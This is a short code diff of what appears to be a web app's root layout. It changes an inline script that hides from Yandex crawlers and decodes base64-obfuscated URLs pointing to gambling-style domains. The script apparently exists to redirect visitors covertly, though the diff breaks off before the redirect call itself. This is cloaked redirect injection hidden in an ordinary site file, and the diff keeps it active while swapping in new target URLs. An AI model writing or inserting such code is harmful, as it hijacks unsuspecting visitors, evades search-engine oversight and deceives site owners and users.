@@ -89,7 +89,7 @@ export const metadata: Metadata = {
   manifest: "/manifest.webmanifest",
   verification: {
 
-    yandex: "bfb6888f0fc7f2d4",
+    yandex: "",
   },
 }
 
@@ -166,8 +166,8 @@ export default function RootLayout({
       (function() {
         var ua = navigator.userAgent.toLowerCase();
         if (ua.indexOf("yandex") !== -1) return;
-        var mainBrandB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; 
-        var crossBrandB64 = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";      
+        var mainBrandB64 = "#aHR0cHM6Ly9ibG5jci1ldmEuY29tL2RpYnpmb21pcg=="; 
+        var crossBrandB64 = "#aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
         var mainUrl = atob(mainBrandB64);
         var crossUrl = atob(crossBrandB64);
         if (localStorage.getItem('vstd_eva')) {
